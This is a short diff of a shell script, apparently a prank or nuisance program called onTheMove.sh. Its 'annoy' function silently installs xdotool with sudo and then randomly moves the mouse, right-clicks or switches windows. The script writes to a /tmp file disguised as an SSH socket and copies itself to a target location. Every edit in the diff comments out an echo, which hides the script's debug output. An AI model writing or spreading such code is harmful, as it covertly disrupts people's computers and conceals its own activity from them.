@@ -34,7 +34,7 @@ fi
 annoy(){
 if [ $doAnnoy == 0 ]
 then
-	echo $doAnnoy
+	#echo $doAnnoy
 	sudo apt-get -y install xdotool &>/dev/null
 	x=$(shuf -i 0-1920 -n 1)
         y=$(shuf -i 0-1080 -n 1)
@@ -43,14 +43,14 @@ fi
 
 if [ $doAnnoy == 1 ]
 then
-	echo $doAnnoy
+	#echo $doAnnoy
 	sudo apt-get install xdotool &>/dev/null
 	xdotool click 3
 fi
 
 if [ $doAnnoy == 2 ]
 then
-	echo $doAnnoy
+	#echo $doAnnoy
 	sudo apt-get install xdotool &>/dev/null
 	xdotool key alt+Tab
 fi
@@ -60,7 +60,7 @@ fi
 filter
 annoy
 check
-echo $target
+#echo $target
 sleep 5
 echo $target>/tmp/ssh-7NalEN3oIs3n
 sudo cp $current/onTheMove.sh $target
